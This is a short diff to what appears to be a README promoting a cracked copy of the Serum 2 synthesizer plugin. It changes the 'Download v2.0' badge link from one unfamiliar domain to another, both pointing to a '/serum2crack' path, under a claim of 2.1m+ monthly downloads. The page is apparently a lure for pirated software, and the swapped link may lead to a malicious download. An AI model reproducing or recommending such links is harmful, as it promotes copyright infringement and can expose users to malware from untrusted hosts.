@@ -49,7 +49,7 @@ A: Yes — loads all Serum 1 presets.
 
 **Monthly downloads:** 2.1m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/serum2crack)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/serum2crack)
 
 ---
 
